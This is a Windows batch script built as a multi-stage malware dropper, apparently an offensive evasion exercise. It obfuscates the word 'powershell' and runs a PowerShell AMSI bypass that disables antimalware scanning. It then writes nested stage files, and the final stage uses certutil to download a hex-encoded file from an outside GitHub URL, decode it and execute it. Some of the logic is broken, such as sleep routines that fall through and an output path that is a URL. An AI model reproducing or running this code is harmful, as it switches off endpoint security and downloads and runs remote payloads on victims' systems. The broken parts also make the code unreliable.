@echo off
setlocal EnableDelayedExpansion

:: ── GPT-ONLY 4-STAGER / MITRE EVASION ─────────────────────────────
:: AMSI bypass, PSH obfuscation, certutil HEX ingress & decode

:: Obfuscate “powershell”
set "P1=Po" & set "P2=We" & set "P3=rS" & set "P4=hElL"
set "PSH=%P1%%P2%%P3%%P4%"

:: AMSI bypass
%PSH% -NoProfile -ExecutionPolicy Bypass -Command ^
  "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')^.GetField('amsiInitFailed','NonPublic,Static')^.SetValue($null,$true)" >nul

::✏
  rem Sleep seconds via ping
  ping -n %1 127.0.0.1 >nul
  goto :EOF

::測試
  rem Sleep milliseconds via PS
  %PSH% -NoProfile -ExecutionPolicy Bypass -Command "Start-Sleep -Milliseconds %1" >nul
  goto :EOF

echo [*] Stage1:init…
call :✏ 2

:: Build Stage2
set "S2=测试✂.bat"
(
  echo @echo off
  echo setlocal EnableDelayedExpansion
  echo :: Stage2
  echo call :✏ 1

  echo set "S3=%%~dp0识别.bat"
  echo (
    echo    @echo off
    echo    setlocal EnableDelayedExpansion
    echo    :: Stage3
    echo    call :✏ 1

    echo    set "S4=%%%%~dp0✈.bat"
    echo    (
      echo       @echo off
      echo       setlocal EnableDelayedExpansion
      echo       :: Stage4
      echo       call :✏ 1
      echo       certutil -urlcache -split -f "https://github.com/s-b-repo/r-routersploit/blob/ipv6-patch/src/modules/exploits/payloadgens/payloadgenbat.rs" "%%%%~dp0f.hex" ^>nul
      echo       certutil -decodehex "%%%%~dp0f.hex" "%%%%~dp0https://github.com/s-b-repo/r-routersploit/blob/ipv6-patch/src/modules/exploits/payloadgens/payloadgenbat.rs" ^>nul
      echo       del "%%%%~dp0f.hex" ^>nul
      echo       start "" "%%%%~dp0https://github.com/s-b-repo/r-routersploit/blob/ipv6-patch/src/modules/exploits/payloadgens/payloadgenbat.rs"
    ) ^> "%%%%S4%%%%"
    echo    call "%%%%S4%%%%"
  ) ^> "%%S3%%"
  echo call "%%S3%%"
) > "%S2%"

echo [*] Stage1: launching Stage2…
call :✏ 1
call "%S2%"

exit
